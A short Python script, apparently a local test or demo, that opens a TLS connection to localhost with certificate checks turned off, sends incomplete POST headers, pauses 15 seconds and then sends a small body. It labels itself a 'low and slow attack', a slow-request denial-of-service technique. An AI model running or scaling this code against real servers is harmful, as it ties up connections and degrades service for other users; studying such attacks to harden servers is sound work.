import socket
import ssl
import time

def low_slow_attack(host="127.0.0.1", port=8443):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connected. Initiating low and slow attack...")
            request = (
                "POST / HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: 50\r\n"
            )
            ssock.sendall(request.encode())
            time.sleep(15)  # Longer delay before sending payload
            body = '{"message": "slow attack"}\r\n'
            ssock.sendall(body.encode())
            print("Attack completed.")

if __name__ == "__main__":
    low_slow_attack()
